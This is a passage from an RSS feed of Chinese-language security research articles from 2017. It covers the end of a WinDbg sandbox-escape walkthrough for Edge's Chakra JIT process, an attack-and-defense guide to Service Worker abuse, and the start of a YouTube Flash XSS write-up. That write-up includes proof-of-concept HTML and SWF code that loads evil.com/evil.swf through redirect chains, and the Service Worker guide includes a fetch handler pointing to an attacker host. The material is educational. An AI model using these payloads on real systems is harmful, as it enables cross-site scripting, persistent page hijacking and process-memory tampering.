r15=00000251fcb2af48&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;JIT 句柄现在被保存到了 r8，当前的值为 0x960。我们继续运行，看看结果。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;0:015&amp;gt;
g

...&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;进程执行一段时间后，我们再次中断并看看句柄是否还在正常运作&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;ca65&quot;&gt;(13f0.16f0):
Break instruction exception - code 80000003 (first chance)
ntdll!DbgBreakPoint:
00007ff8`37d58d70
cc int 3&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;让我们再次调用 DuplicateHandle，但这次要额外设置参数到寄存器/栈中。如下的操作相当于调用 DuplicateHandle(jit_server_handle, GetCurrentProcess(), GetCurrentProcess(), pointer_for_storing_return_value, 0,0, DUPLICATE_SAME_ACCESS)：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;ca65&quot;&gt;0:039&amp;gt;
r
rax=ffffffffffffffff
rbx=ffffffffffffffff rcx=0000000000000960
rdx=ffffffffffffffff
rsi=0000000000000000 rdi=0000000000000000
rip=00007ff81a307a4d
rsp=000000d2731ffb28 rbp=0000000000000000
r8=ffffffffffffffff r9=000000d2731ffc28 r10=00000fff06fb0a64
r11=0222001000880020
r12=0000000000000000 r13=0000000000000000
r14=0000000000000000
r15=0000000000000000
iopl=0 nv up ei ng nz na po nc
cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000286
chakra!ThreadContext::EnsureJITThreadContext+0xa9:
00007ff8`1a307a4d
ff1575785b00 call qword ptr [chakra!_imp_DuplicateHandle
(00007ff8`1a8bf2c8)] ds:00007ff8`1a8bf2c8={KERNELBASE!DuplicateHandle
(00007ff8`34408de0)}
0:039&amp;gt;
p
chakra!ThreadContext::EnsureJITThreadContext+0xaf:
00007ff8`1a307a53
85c0 test eax,eax
0:039&amp;gt;
r
rax=0000000000000001
rbx=ffffffffffffffff rcx=00007ff837d55b34
rdx=0000000000000000
rsi=0000000000000000 rdi=0000000000000000
rip=00007ff81a307a53
rsp=000000d2731ffb28 rbp=0000000000000000
r8=000000d2731ffad0 r9=0000000000000000 r10=0000000000000000
r11=0000000000000246
r12=0000000000000000 r13=0000000000000000
r14=0000000000000000
r15=0000000000000000
iopl=0 nv up ei pl nz ac pe nc
cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000212
chakra!ThreadContext::EnsureJITThreadContext+0xaf:
00007ff8`1a307a53
85c0 test eax,eax&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;这次的调用成功了（ DuplicateHandle 返回1)如果你再看看指向第四个参数的内存，你能得到返回的句柄(0xef4)。有了这样的权限，内容进程可以轻易地控制JIT。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;ca65&quot;&gt;0:039&amp;gt;
r rcx=ef4
0:039&amp;gt;
r rip=kernelbase!getprocessid

...

0:039&amp;gt;
r
rax=00000000000010cc
rbx=ffffffffffffffff rcx=00007ff837d556d4
rdx=0000000000000000
rsi=0000000000000000 rdi=0000000000000000
rip=00007ff834459a35
rsp=000000d2731ffac0 rbp=0000000000000000
r8=000000d2731ffab8 r9=0000000000000000 r10=0000000000000000
r11=0000000000000246
r12=0000000000000000 r13=0000000000000000
r14=0000000000000000
r15=0000000000000000
iopl=0 nv up ei pl zr na po nc
cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246
KERNELBASE!GetProcessId+0x25:
00007ff8`34459a35
4883c468 add rsp,68h&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;GetProcessId 返回了0x10cc（相当于4300），刚好和 JIT 的 PID 对应。让我们试试给 JIT分配内存，不要忘了设置第五个参数（0x4）。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;0:039&amp;gt;
r rcx=ef4
0:039&amp;gt;
r rdx=0
0:039&amp;gt;
r r8=1000
0:039&amp;gt;
r r9=3000
0:039&amp;gt;
r rip=kernelbase!virtualallocex

...

0:039&amp;gt;
r
rax=000001b929730000
rbx=ffffffffffffffff rcx=00007ff837d556b4
rdx=0000000000000000
rsi=0000000000000000 rdi=0000000000000000
rip=00007ff8343fff16
rsp=000000d2731ffa88 rbp=0000000000000000
r8=000000d2731ffa40 r9=0000000000000000 r10=0000000000000000
r11=0000000000000246
r12=0000000000000000 r13=0000000000000000
r14=0000000000000000
r15=0000000000000000
iopl=0 nv up ei pl nz ac pe nc
cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000212
KERNELBASE!VirtualAllocEx+0x16:
00007ff8`343fff16
4883c438 add rsp,38h&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;成功了！我们现在能在&lt;br&gt;0x1b929730000中给 JIT 分配内存。最后，让我们看看我们是否能在 JIT中写内存。 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;0:039&amp;gt;
r rcx=ef4
0:039&amp;gt;
r rdx=000001b929730000
0:039&amp;gt;
r r8=000000d2`731ffce0
0:039&amp;gt;
r r9=10
0:039&amp;gt;
r rip=kernelbase!writeprocessmemory

...

0:039&amp;gt;
r
rax=0000000000000001
rbx=ffffffffffffffff rcx=0000000000000000
rdx=000000d2731fff00
rsi=0000000000000000 rdi=0000000000000000
rip=00007ff834469af9
rsp=000000d2731ffa88 rbp=0000000000000000
r8=000000d2731ff9e8 r9=000000d2731ffa70 r10=0000000000000000
r11=000000d2731ffa70
r12=0000000000000000 r13=0000000000000000
r14=0000000000000000
r15=0000000000000000
iopl=0 nv up ei pl zr na po nc
cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246
KERNELBASE!WriteProcessMemory+0xb9:
00007ff8`34469af9
c3 ret&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;再一次！如下截图，现在我们成功地将十六字节的数据写入到了该地址中。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-ef1fc2803d8c1600f7f33e3179e1562d_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1330&quot; data-rawheight=&quot;801&quot;&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-10-03-29859057</guid>
<pubDate>Tue, 03 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>如何利用/防御 Service Worker</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-09-29-29734820.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;如何利用/防御 Service Worker&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29734820&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;service worker是一段脚本，与web worker一样，也是在后台运行。作为一个独立的线程，运行环境与普通脚本不同，所以不能直接参与web交互行为。native app可以做到离线使用、消息推送、后台自动更新，service worker的出现是正是为了使得web app也可以具有类似的能力。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在这篇文章中，我将讲解：&lt;/p&gt;&lt;p&gt;攻击：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Service Worker是什么？&lt;/li&gt;&lt;li&gt;我们如何用SW攻击？&lt;/li&gt;&lt;li&gt;一些SW的攻击案例。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;防护:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;开发者们有什么对策?&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;对SW进行register（注册）&lt;/b&gt;&lt;/h2&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt;
navigator.serviceWorker.register(&quot;/sw.js&quot;)
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;注册SW时必须满足以下要求：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;和register操作的页面处于同源&lt;/li&gt;&lt;li&gt;运行Secure Context&lt;/li&gt;&lt;li&gt;Content-Type的种类应该为javascript，比如以下几种类型&lt;/li&gt;&lt;/ol&gt;&lt;ul&gt;&lt;li&gt;&lt;i&gt;text/javascript&lt;/i&gt;&lt;/li&gt;&lt;li&gt;&lt;i&gt;application/x-javascript&lt;/i&gt;&lt;/li&gt;&lt;li&gt;&lt;i&gt;application/javascript&lt;/i&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Secure Context又是什么？&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Secure Context指的是来源必须是安全的(比如HTTPS)或者来自默认的(如：&lt;a href=&quot;http://localhost/&quot;&gt;http://localhost&lt;/a&gt; )。通过这些限制，我们可以阻止中间人(MITM)攻击。除此之外，我们还要限制某些特权API（比如获得地理位置，Web&lt;br&gt;USB，摄像头/录音器的API）&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;曾经的Application Cache&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在Service Woeker出现前，人们使用AppCache进行缓存。由于AppCache使用复杂并且不受Secure&lt;br&gt;Context限制，人们就用SW替换了AppCahce。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;有了更严格的限制，攻击者应该如何利用SW呢？通常来讲，我们需要在HTTPS的同源网站中：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;找到XSS，利用XSS注册SW Script&lt;/li&gt;&lt;li&gt;找到可利用的SW Script位置(而且Content-Type得为javascript，有没有什么简单粗暴的途径帮我们找到属于我们的Service Worker Script呢？)&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;捷径１——JSONP&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;有些时候，我们可以指定回调函数为被注册的脚本，以此写入任意代码&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://example.com/jsonp?callback=alert(1)//&quot;&gt;https://example.com/jsonp?callback=alert(1)//&lt;/a&gt;&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;HTTP/1.1
200 OK
Content-Type:
text/javascript; charset=UTF-8
[...]

alert(1)//({});&lt;/code&gt;&lt;p&gt;一个XSS+JSONP的案例：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;https://example.com/xss?=&amp;lt;script&amp;gt;navigator.serviceWorker[...]

&amp;lt;script&amp;gt;
navigator.serviceWorker.register(&quot;/jsonp?callback=[SW_HERE]//&quot;);
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;https://example.com/jsonp?q=onfetch=e=&amp;gt;console.log(&#39;fetch&#39;)//

HTTP/1.1
200 OK
Content-Type:
text/javascript; charset=UTF-8
[...]
onfetch=event=&amp;gt;console.log(&#39;fetch&#39;)//({});&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;捷径２——文件上传&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当一个服务器允许我们上传JavaScript文件时，它返回该文件的Content-Type也极有可能是JavaScript。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这是一个文件上传XSS+SW register的场景：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt;
var
formData = new FormData();
formData.append(&quot;csrf_token&quot;,
&quot;secret&quot;);
var
sw = &quot;/* [SW_CODE] */&quot;;
var
blob = new Blob([sw], { type: &quot;text/javascript&quot;});
formData.append(&quot;file&quot;,
blob, &quot;sw.js&quot;);
fetch(&quot;/upload&quot;,
{method: &quot;POST&quot;, body: formData}).then(/* Register SW */);
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;成功注册脚本之后呢？&lt;/b&gt;&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;我们对页面更持久的控制（比如存储型XSS)。就算用来注册的XSS失效，我们也依然可以使用SW对页面进行后续控制。&lt;/li&gt;&lt;li&gt;监听/更改请求或响应&lt;/li&gt;&lt;li&gt;使用恶意Flash跨域读取内容&lt;/li&gt;&lt;li&gt;升级反射型XSS变成存储型XSS&lt;/li&gt;&lt;li&gt;可以一直持续到SW过期&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;打个比方，无论访问哪个URL，下面的代码都只会返回alert:&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;onfetch=e=&amp;gt;{
body =
&#39;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&#39;;
init =
{headers:{&#39;content-type&#39;:&#39;text/html&#39;}};
e.respondWith(new Response(body,init));
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Service Worker限制之一：Scope&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在使用`navigator.serviceWorker.register()`注册脚本时，我们可以在第二个参数中提供一个Scope（范围）。调用超出该Scope的资源会被视为非法行为。那么怎么定义合法的scope呢？在注册脚本时，我们需要提供一个相对地址，该目录的上一层或同级目录都被视为不可控的Scope，不过开发者可以控制自身及子目录。如果省略该参数，第一个参数下的目录会被成Scope。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;例如：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt;
navigator.serviceWorker.register(&quot;/sw.js&quot;,
{scope: &quot;/&quot;})
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;除此之外，我们只能指定同源的地址：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;无效：&quot;/assets/js/sw.js&quot;,
{scope: &quot;https://other.example.com/&quot;}
无效：&quot;/assets/js/sw.js&quot;, {scope:
&quot;/assets/&quot;}
无效：&quot;/assets/js/sw.js&quot;, {scope:
&quot;/assets/css/&quot;}
有效：&quot;/assets/js/sw.js&quot;, {scope:
&quot;/assets/js/&quot;}
有效：&quot;/assets/js/sw.js&quot;, {scope:
&quot;/assets/js/sub/&quot;}&lt;/code&gt;&lt;p&gt;如果你开启了 Service-Worker-Awed 头，那么就可以指定同域下开启该header的任意路径。(下面的例子允许我们用/当Scope)&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;HTTP/1.1
200 OK
content-type:
text/javascript
service-worker-allowed:
/
[...]&lt;/code&gt;&lt;p&gt;在某些情况下（一般来讲，攻击者会被规范禁止），你可以通过编码/来突破上述限制：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://example.com/api/jsonp
https://example.com/api%2Fjsonp&lt;/code&gt;&lt;p&gt;除了注册时有这种越权风险，我们注册后也有可能通过编码绕过scope限制（同样取决于服务器的设定）。打个比方，我们可以用这两种形式表示同一个页面：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://example.com/out-of-scope/
https://example.com/foo/..%2Fout-of-scope%2F&lt;/code&gt;&lt;p&gt;如果我们用/foo/来当Service Worker的Scope。当我们访问/foo/..%2Fout-of-scope%2F时，我们就可以越权获得信息。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Service Worker限制之二：生命周期&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;为了保证安全性，每个Service Worker都有时间限制。在授权24小时后（用PC时钟确定时间），原先的HTTP缓存将被清除。脚本需要被重新注册以正常使用，否则会被摧毁。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;XSS+SW+Flash&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;如果捕捉到Flash响应，我们可以用该响应创建一个有该源权限的恶意Flash（只对firefox有用，chrome会直接下载Flash）&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;onfetch=e=&amp;gt;{
e.respondWith(fetch(&quot;//attacker/poc.swf&quot;))
}&lt;/code&gt;&lt;p&gt;这有什么危害呢？当example.com存在如下的crossdomain时：&lt;/p&gt;&lt;code lang=&quot;xml&quot;&gt;&amp;lt;?xml
version=&quot;1.0&quot;?&amp;gt;
&amp;lt;cross-domain-policy&amp;gt;
&amp;lt;allow-access-from
domain=&quot;example.jp&quot; /&amp;gt;
&amp;lt;/cross-domain-policy&amp;gt;&lt;/code&gt;&lt;p&gt;我们可以在example.jp上创建flash并读取example.com内容（某种意义上的SOP绕过）。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Foreign fetch&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;只要资源被当前源引用，即使是不同源的图像或脚本也可以被service worker篡改&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;比如在example.jp下有这么一个标签：&lt;/p&gt;&lt;blockquote&gt;&amp;lt;script src=&quot;//example.com/socialbutton.js&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;由于example.com的资源被example.jp调用，example.jp的SW可以直接修改socialbutton.js&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们可以用Foreign Fetch来制造XSS：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;self.addEventListener(&#39;install&#39;,e =&amp;gt; {
e.registerForeignFetch({
scopes: [&#39;/&#39;],
origins:
[&#39;*&#39;]//通配所有的源
});});

onforeignfetch= e =&amp;gt; {
e.respondWith(fetch(e.request).then(res =&amp;gt;
({
response:
new Response(&#39;alert(1)&#39;)//返回弹窗代码
})))}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;攻击SW cache（缓存）&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;注意，HTTP cache不等于SW Cache。只有在被脚本调用时才会返回cache。&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;onfetch= event =&amp;gt; {
event.respondWith(
caches.open(&quot;v1&quot;).then(function(cache) {
return cache.match(event.request).then(function(response) {
if (response) {
return response;//
} else {
return fetch(event.request.clone()).then(function(response) {
cache.put(event.request,
response.clone());//
return response;
});}})}));
};&lt;/code&gt;&lt;p&gt;攻击这可以用XSS添加请求/响应到cahce中（这个例子添加了posion.html到响应中）&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt;
caches.open(&quot;v1&quot;).then(function(cache){
content =
&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;;
init = {headers: {&quot;content-type&quot;:
&quot;text/html&quot;}};
request = new
Request(&quot;poison.html&quot;);
response = new Response(content, init);
cache.put(request, response);
})
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;比较：基于localStorage的XSS&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;考虑以下localStorage的误用：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt;
document.write(localStorage.getItem(&#39;name&#39;));
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;在Service Worker中，我们不可以直接对DOM进行操作，而且SW也有24小时的生命周期。但是由于SW及其强大的特权，很难说SW cache比localStorage更安全&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;防御：如何删除Service Worker?&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;通过JavaScript&lt;/li&gt;&lt;li&gt;使用Clear-Site-Data headers&lt;/li&gt;&lt;li&gt;手动消除（仅使用于Chrome）&lt;/li&gt;&lt;li&gt;chrome://serviceworker-internals（不过Cache Storage不会被删除）&lt;/li&gt;&lt;li&gt;开发者工具 -&amp;gt; Application -&amp;gt; Clear Storage&lt;/li&gt;&lt;li&gt;chrome://settings/clearBrowserData -&amp;gt; Clear Browser Data&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Clear-Site-Data头&lt;/b&gt;&lt;/p&gt;&lt;p&gt;这个头可以删除当前源的所有的存储数据（或者指定数据），比如说：Clear-Site-Data:&quot;cookie&quot;可以删除所有cookie。该功能已经在Chrome61得到了支持。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;一个清除storage的响应：&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;HTTP/1.1
200 OK
Content-Type:text/html
Clear-Site-Data:
&quot;storage&quot;&lt;/code&gt;&lt;h2&gt;&lt;b&gt;如何阻止他人注册恶意SW&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当注册SW时，会发生如下的请求：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;GET https://example.com/sw.js HTTP/1.1
Host:example.com
Connection:keep-alive
Pragma:no-cache
Cache-Control:no-cache
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
likeGecko) Chrome/61.0.3163.79 Safari/537.36
Accept:*/*
Service-Worker:script
Referer: https://example.com/
Accept-Encoding:
gzip, deflate, br
Accept-Language:
ja,en;q=0.8,en-US;q=0.6```&lt;/code&gt;&lt;p&gt;我们可以通过拒绝非SW Script却又包含Service-Worker:script头的请求以进行防范&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;基于Service Worker的XSS可能带来的问题：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;XSS持久化&lt;/li&gt;&lt;li&gt;新型Flash攻击&lt;/li&gt;&lt;li&gt;SW缓存劫持&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;如何进行防御：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;治病需治根：防范XSS&lt;/li&gt;&lt;li&gt;拒绝非SW Script（比如jsonp，文件上传功能）对Service-Worker:script的请求&lt;/li&gt;&lt;/ol&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-09-29-29734820</guid>
<pubDate>Fri, 29 Sep 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Flash漏洞的死灰复燃4</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-09-23-29603213.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Flash漏洞的死灰复燃4&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29603213&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-15c5fa926c08ed689f8fa33eaea7cc9b_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;Youtube以 &lt;i&gt;youtube.com/embed/[VIDEO_ID]&lt;/i&gt; 的地址形式提供了 HTML5 API。当 iframe 开始加载时，它会首先检查浏览器是否支持 HTML5 播放器。如果不行的话，它会退回成 flash 播放器。不过用户也可在 url 中使用 nohtml5=1 参数来强制使用 flash 播放器。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这是大致流程：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-ae7c78e597fb6fa793246083cc05e121_r.jpg&quot; data-rawwidth=&quot;1144&quot; data-rawheight=&quot;762&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;如果你用我们[第一部分]的实例和这一个作对比，你会发现 iframe&quot;Youtube Embed&quot;实质上代替了&quot;Youtube Wrapper&quot;，Flash/javascript 转换API也被换成了更加现代化的 postMessage 和 sharedEvent。换个角度来想，Flash 和 HTML5 都提供了类似的功能，只是实现不一样罢了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Youtube的Flash API和iframe API十分相似。浏览器也因此实现了一个奇葩的行为，它们会自动把&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;object data=”youtube.com/v/[VIDEO_ID]”&amp;gt;
(Youtube Flash api)替换成&amp;lt;object
data=”youtube.com/embed/[VIDEO_ID]”&amp;gt;(Youtube iframe api) 以强制将网站的Flash换为html5&lt;/code&gt;&lt;p&gt;触发 Youtube 上基于 Flash 的 XSS 不一定要直接从主站，在这里，我们将介绍如何利用命令发送功能&lt;i&gt;（如 playVideo() ,pauseVideo() ）&lt;/i&gt;攻陷Flash文件。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;基于loadPlaylist的XSS&lt;/h2&gt;&lt;p&gt;loadPlaylist() 允许 youtube 的 iframe 加载一个播放列表。它的参数一般为 Youtube 的某个播放列表 id 或者一个包含 Youtube 视频 ID 的数组。当选择使用数组时，我们还可以给每个视频注入预览图片 url。&lt;br&gt;&lt;/p&gt;&lt;p&gt;Flash也用 Loader.load 加载图像（和加载外部Flash文件 一样），我们可以将图片URL替换为swf 文件，原本用来加载 Loader.load 现在则会执行 swf。不过主程序会先检查一遍该 URL 是否在 youtube.com 域上，再加载该 URL。所幸的是，谷歌并不会修复 URL 任意跳转漏洞。我们便可以使用 youtube 的跳转功能完成攻击。虽然 Youtube 只能重定向用户到 google.com，但我进一步利用了谷歌的任意跳转来达到目的：&lt;br&gt;https://accounts.youtube.com/accounts/SetSID?continue=https://www.google.com/amp/s/evil.com/evil.swf。当Youtube.com/embed/XXX加载了evil.swf，我们就可以使用自己的XSS payload了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;默认情况下，Flash只给同一个域名下的Flash开启Flash/js转换API。但youtube.com/embed/[VIDEO_ID] &amp;lt;object&amp;gt;标签使用了属性 allowscriptaccess=always （对任意Flash开启Flash/js转换API）&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这是PoC的大致流程：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-368d9ab8d113aea3a48afc5b48279f10_r.jpg&quot; data-rawwidth=&quot;1372&quot; data-rawheight=&quot;556&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;evil.com/evil.html源代码：&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;!-- 降级Youtube iframe html5播放器为Flash播放器
--&amp;gt;
&amp;lt;iframe id=&quot;player&quot;
src=&quot;https://www.youtube.com/embed/?nohtml5=1&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
&amp;lt;script&amp;gt;
// 延迟5秒，让 Youtube iframe 完全加载
setTimeout(
function(){
// 用postMessage发送loadPlaylist和预览图像链接命令给Youtube iframe
document.getElementById(&quot;player&quot;).contentWindow.postMessage(&#39;{&quot;command&quot;:&quot;loadPlaylist&quot;,&quot;data&quot;:[{&quot;video_id&quot;:&quot;xyz&quot;,&quot;iurl&quot;:&quot;https://accounts.youtube.com/accounts/SetSID?continue=https%3A%2F%2Fwww.google.com%2Famp%2Fs%2Fevil.com%2Fevil.swf&quot;}]}&#39;,
&quot;*&quot;);
}
, 5000);
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;evil.swf源代码：&lt;/p&gt;&lt;code lang=&quot;as3&quot;&gt;public class Main extends Sprite {
public function Main(){
// 用Flash/js转换API执行XSS
ExternalInterface.call(&quot;alert&quot;, &quot;document.domain + &#39;
XSSed!&#39;&quot;);
}
}&lt;/code&gt;&lt;p&gt;攻击场景：&lt;/p&gt;&lt;p&gt;要求：目标开启了Flash player&lt;/p&gt;&lt;ol&gt;&lt;li&gt;目标浏览evil.com/evil.html&lt;/li&gt;&lt;li&gt;evil.html加载youtube.com/embed iframe&lt;/li&gt;&lt;li&gt;evil.com发送payload&lt;/li&gt;&lt;li&gt;youtube.com/embed加载了evil.swf&lt;/li&gt;&lt;li&gt;evil.com在youtube.com/embed中执行了XSS&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;trustedLoader正则表达式引起的血案&lt;/h2&gt;&lt;p&gt;除了像 playVideo 和 loadPlaylist 这类的公开命令外，Youtube也有许多私有命令。不过它们只能被验证过的源加载（比方说google&lt;br&gt;drive）。往往程序用了一个正则去过滤，如下：&lt;/p&gt;&lt;code lang=&quot;as&quot;&gt;public static const trustedLoader:RegExp = new
